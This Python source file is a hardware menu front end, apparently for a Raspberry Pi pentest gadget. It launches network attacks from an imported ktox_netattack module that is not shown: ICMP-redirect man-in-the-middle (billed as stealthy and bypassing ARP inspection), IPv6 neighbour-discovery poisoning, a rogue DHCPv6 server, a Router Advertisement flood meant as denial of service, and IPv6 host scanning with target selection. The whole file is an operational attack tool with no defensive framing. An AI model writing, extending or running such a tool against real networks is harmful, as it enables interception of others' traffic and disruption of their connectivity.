#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# hw/ktox_hw_netattack.py — KTOx Network Attack Engine (Hardware GUI)
#
# Wraps ktox_netattack.py with RaspyJack LCD/GPIO interface:
#   ICMP Redirect · NDP Spoof · DHCPv6 Spoof · RA Flood · IPv6 Scanner
#
# Controls: UP/DOWN scroll · OK select · KEY3 back/stop

import sys, os, time, signal, threading

_HW_DIR = os.path.dirname(os.path.abspath(__file__))
_ROOT   = os.path.dirname(_HW_DIR)
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from ktox_hw_utils import (
    hw_init, hw_cleanup, push,
    clear_buf, draw_header, draw_status, draw_menu, draw_centered,
    draw_running, draw_result,
    read_btn, wait_for_btn,
    scan_and_pick, get_iface_and_gateway, get_network_cidr,
    install_signal_handlers, make_logger, loot_dir,
    C, FONT_TITLE, FONT_MENU, FONT_SMALL, LCD_W, LCD_H,
)

log = make_logger("netattack")

LCD = IMAGE = DRAW = None
RUNNING = True

MENU_ITEMS = [
    "ICMP REDIRECT",
    "NDP SPOOF",
    "DHCPv6 SPOOF",
    "RA FLOOD",
    "IPv6 SCAN",
    "< BACK",
]
MENU_COLORS = [
    C["BLOOD"], C["BLOOD"], C["BLOOD"], C["EMBER"], C["STEEL"], C["DIM"],
]


def cleanup(*_):
    global RUNNING
    if not RUNNING:
        return
    RUNNING = False
    hw_cleanup(LCD)
    sys.exit(0)


def _try_import_net():
    try:
        import ktox_netattack as n
        return n
    except Exception as e:
        log(f"import ktox_netattack failed: {e}")
        return None


def _wait_stop(stop_event, title, subtitle="", pkt_ref=None):
    pkt_ref = pkt_ref or [0]
    last_t  = 0.0
    elapsed = 0
    t_start = time.time()
    while not stop_event.is_set():
        elapsed = int(time.time() - t_start)
        clear_buf(DRAW)
        draw_running(DRAW, title, line1=subtitle,
                     pkt_count=pkt_ref[0], elapsed=elapsed)
        push(LCD, IMAGE)
        btn, last_t = read_btn(last_t)
        if btn in ("KEY3", "LEFT"):
            stop_event.set()
            break
        time.sleep(0.15)


# ══════════════════════════════════════════════════════════════════════════════

def op_icmp_redirect(n, iface, gw_ip, target_ip):
    """ICMP redirect MITM — stealthy, bypasses DAI/ARP inspection."""
    import socket
    my_ip = socket.gethostbyname(socket.gethostname()) or gw_ip

    stop  = threading.Event()
    pkts  = [0]
    try:
        attack = n.ICMPRedirectAttack(
            iface=iface, gateway_ip=gw_ip,
            target_ip=target_ip, attacker_ip=my_ip,
            pkt_ref=pkts,
        )
        t = threading.Thread(target=attack.start, daemon=True)
        t.start()
        log(f"ICMP_REDIRECT_START target={target_ip}")
        _wait_stop(stop, "ICMP REDIR", subtitle=target_ip, pkt_ref=pkts)
        attack.stop()
        t.join(timeout=3)
        log(f"ICMP_REDIRECT_STOP pkts={pkts[0]}")
        draw_result(DRAW, "REDIR DONE",
                    [f"target: {target_ip}", f"pkts: {pkts[0]}"], color=C["GOOD"])
    except Exception as e:
        log(f"icmp_redirect error: {e}")
        draw_result(DRAW, "REDIR ERR", [str(e)[:20]], color=C["BLOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_ndp_spoof(n, iface, target_ip6, gw_ip6):
    """IPv6 Neighbor Discovery poisoning (IPv6 ARP equivalent)."""
    stop  = threading.Event()
    pkts  = [0]
    try:
        spoofer = n.NDPSpoofer(
            iface=iface, target_ipv6=target_ip6,
            gateway_ipv6=gw_ip6, pkt_ref=pkts,
        )
        t = threading.Thread(target=spoofer.start, daemon=True)
        t.start()
        log(f"NDP_SPOOF_START target={target_ip6}")
        _wait_stop(stop, "NDP SPOOF", subtitle=target_ip6[:15], pkt_ref=pkts)
        spoofer.stop()
        t.join(timeout=3)
        log(f"NDP_SPOOF_STOP pkts={pkts[0]}")
        draw_result(DRAW, "NDP DONE",
                    [target_ip6[:18], f"pkts: {pkts[0]}"], color=C["GOOD"])
    except Exception as e:
        log(f"ndp_spoof error: {e}")
        draw_result(DRAW, "NDP ERR", [str(e)[:20]], color=C["BLOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_dhcpv6_spoof(n, iface):
    """Rogue DHCPv6 server."""
    stop = threading.Event()
    try:
        server = n.DHCPv6Spoofer(iface=iface)
        t      = threading.Thread(target=server.start, daemon=True)
        t.start()
        log("DHCPv6_START")
        _wait_stop(stop, "DHCPv6", subtitle="rogue server")
        server.stop()
        t.join(timeout=3)
        log("DHCPv6_STOP")
        draw_result(DRAW, "DHCPv6 DONE", ["Rogue server", "stopped"], color=C["GOOD"])
    except Exception as e:
        log(f"dhcpv6 error: {e}")
        draw_result(DRAW, "DHCPv6 ERR", [str(e)[:20]], color=C["BLOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_ra_flood(n, iface):
    """Rogue Router Advertisement flood — random prefix DoS."""
    stop = threading.Event()
    pkts = [0]
    try:
        flood = n.RAFlood(iface=iface, pkt_ref=pkts)
        t     = threading.Thread(target=flood.start, daemon=True)
        t.start()
        log("RA_FLOOD_START")
        _wait_stop(stop, "RA FLOOD", subtitle="IPv6 RA", pkt_ref=pkts)
        flood.stop()
        t.join(timeout=3)
        log(f"RA_FLOOD_STOP pkts={pkts[0]}")
        draw_result(DRAW, "RA DONE",
                    [f"pkts: {pkts[0]}"], color=C["GOOD"])
    except Exception as e:
        log(f"ra_flood error: {e}")
        draw_result(DRAW, "RA ERR", [str(e)[:20]], color=C["BLOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_ipv6_scan(n, iface):
    """ICMPv6 neighbor solicitation host discovery."""
    clear_buf(DRAW)
    draw_header(DRAW, "IPv6 SCAN", color=C["STEEL"])
    draw_centered(DRAW, "sending NS...", 50, FONT_MENU, fill=C["STEEL"])
    push(LCD, IMAGE)

    hosts = []
    try:
        scanner = n.IPv6Scanner(iface=iface)
        hosts   = scanner.scan(timeout=15)
        log(f"IPv6_SCAN_DONE hosts={len(hosts)}")
    except Exception as e:
        log(f"ipv6_scan error: {e}")

    if not hosts:
        draw_result(DRAW, "IPv6 SCAN", ["no IPv6 hosts found"], color=C["ORANGE"])
        push(LCD, IMAGE)
        wait_for_btn(["KEY3", "LEFT"])
        return

    sel    = 0
    last_t = 0.0
    while True:
        clear_buf(DRAW)
        draw_header(DRAW, f"IPv6 ({len(hosts)})", color=C["STEEL"])
        labels = [str(h)[:20] for h in hosts]
        draw_menu(DRAW, labels, sel, item_colors=[C["WHITE"]] * len(hosts))
        draw_status(DRAW, "KEY3: BACK", color=C["DIM"])
        push(LCD, IMAGE)

        btn, last_t = read_btn(last_t)
        if btn == "UP":
            sel = (sel - 1) % len(hosts)
        elif btn == "DOWN":
            sel = (sel + 1) % len(hosts)
        elif btn in ("KEY3", "LEFT"):
            break
        time.sleep(0.05)


def _get_ipv6_gateway(iface):
    """Attempt to get IPv6 default gateway."""
    try:
        import subprocess
        out = subprocess.check_output(
            ["ip", "-6", "route", "show", "default"], text=True, timeout=3
        )
        for line in out.splitlines():
            if "via" in line:
                parts = line.split()
                return parts[parts.index("via") + 1]
    except Exception:
        pass
    return "fe80::1"


# ══════════════════════════════════════════════════════════════════════════════
def main():
    global LCD, IMAGE, DRAW

    n = _try_import_net()
    if not n:
        clear_buf(DRAW)
        draw_header(DRAW, "NETATTACK", color=C["BLOOD"])
        draw_centered(DRAW, "ktox_netattack", 40, FONT_MENU, fill=C["ORANGE"])
        draw_centered(DRAW, "not found", 55, FONT_SMALL, fill=C["ORANGE"])
        push(LCD, IMAGE)
        time.sleep(3)
        return

    iface, iface_mac, gw_ip = get_iface_and_gateway()
    if not iface:
        clear_buf(DRAW)
        draw_header(DRAW, "NETATTACK", color=C["BLOOD"])
        draw_centered(DRAW, "no interface!", 50, FONT_MENU, fill=C["BLOOD"])
        push(LCD, IMAGE)
        wait_for_btn(["KEY3"])
        return

    network  = get_network_cidr(iface)
    gw_ip6   = _get_ipv6_gateway(iface)

    sel    = 0
    last_t = 0.0

    while RUNNING:
        clear_buf(DRAW)
        draw_header(DRAW, "NETATTACK", color=C["BLOOD"])
        draw_menu(DRAW, MENU_ITEMS, sel, item_colors=MENU_COLORS)
        draw_status(DRAW, "OK:RUN  KEY3:BACK", color=C["DIM"])
        push(LCD, IMAGE)

        btn, last_t = read_btn(last_t)
        if btn == "UP":
            sel = (sel - 1) % len(MENU_ITEMS)
        elif btn == "DOWN":
            sel = (sel + 1) % len(MENU_ITEMS)
        elif btn in ("OK", "KEY_PRESS", "RIGHT"):
            choice = MENU_ITEMS[sel]

            if choice == "ICMP REDIRECT":
                host = scan_and_pick(LCD, IMAGE, DRAW, iface, network,
                                     title="REDIR TARGET", allow_gw=False,
                                     gateway_ip=gw_ip)
                if host:
                    op_icmp_redirect(n, iface, gw_ip, host[0])

            elif choice == "NDP SPOOF":
                # Scan for IPv6 hosts first
                clear_buf(DRAW)
                draw_header(DRAW, "NDP SPOOF", color=C["BLOOD"])
                draw_centered(DRAW, "scanning IPv6...", 50, FONT_MENU, fill=C["STEEL"])
                push(LCD, IMAGE)
                try:
                    scanner  = n.IPv6Scanner(iface=iface)
                    hosts_v6 = scanner.scan(timeout=10)
                    if hosts_v6:
                        # Pick one
                        s2     = 0
                        last_t2 = 0.0
                        while True:
                            clear_buf(DRAW)
                            draw_header(DRAW, "IPv6 TARGET", color=C["BLOOD"])
                            labels = [str(h)[:20] for h in hosts_v6]
                            draw_menu(DRAW, labels + ["< BACK"], s2,
                                      item_colors=[C["WHITE"]] * len(hosts_v6) + [C["DIM"]])
                            draw_status(DRAW, "OK:SEL KEY3:BACK", color=C["DIM"])
                            push(LCD, IMAGE)
                            btn2, last_t2 = read_btn(last_t2)
                            if btn2 == "UP":
                                s2 = (s2 - 1) % (len(hosts_v6) + 1)
                            elif btn2 == "DOWN":
                                s2 = (s2 + 1) % (len(hosts_v6) + 1)
                            elif btn2 in ("OK", "KEY_PRESS"):
                                if s2 < len(hosts_v6):
                                    op_ndp_spoof(n, iface, str(hosts_v6[s2]), gw_ip6)
                                break
                            elif btn2 in ("KEY3", "LEFT"):
                                break
                            time.sleep(0.05)
                    else:
                        draw_result(DRAW, "NDP", ["no IPv6 hosts"], color=C["ORANGE"])
                        push(LCD, IMAGE)
                        wait_for_btn(["KEY3", "LEFT"])
                except Exception as e:
                    log(f"ndp_spoof setup error: {e}")

            elif choice == "DHCPv6 SPOOF":
                op_dhcpv6_spoof(n, iface)

            elif choice == "RA FLOOD":
                op_ra_flood(n, iface)

            elif choice == "IPv6 SCAN":
                op_ipv6_scan(n, iface)

            elif choice == "< BACK":
                break

        elif btn == "KEY3":
            break
        time.sleep(0.05)


if __name__ == "__main__":
    install_signal_handlers(cleanup)
    try:
        LCD, IMAGE, DRAW = hw_init()
        main()
    finally:
        cleanup()
